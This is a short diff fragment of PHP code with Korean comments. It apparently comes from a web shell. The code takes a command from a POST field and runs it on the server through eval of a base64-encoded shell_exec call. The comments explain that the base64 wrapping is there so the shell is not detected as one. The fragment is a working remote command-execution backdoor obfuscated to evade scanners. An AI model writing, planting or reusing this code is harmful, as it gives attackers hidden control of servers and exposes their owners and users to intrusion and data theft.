@@ -396,7 +396,7 @@
                 if(!empty($_POST["command"])){
                     echo "<hr>";
                     // $result = shell_exec($_POST["command"]); // 이 shell_exec가 있다면 웹셸임을 탐지, 난독화 필요
-                    eval(base64_decode("JHJlc3VsdCA9IHNoZWxsX2V4ZWMoJF9QT1NUWyJjb21tYW5kIl0pOw=="));
+                    eval(base64_decode("JHJlc3VsdCA9IHNoZWxsX2V4ZWMoJF9QT1NUWyJjb21tYW5kIl0pOw==")); //base64로 난독화
                     $result = str_replace("\n", "<br>", $result);
                     // $result = iconv("CP949", "UTF-8", $result); //원래 인코딩값, 변경할 인코딩값, 대상  -> 맥북에서는 안 됨.
                     echo $result;
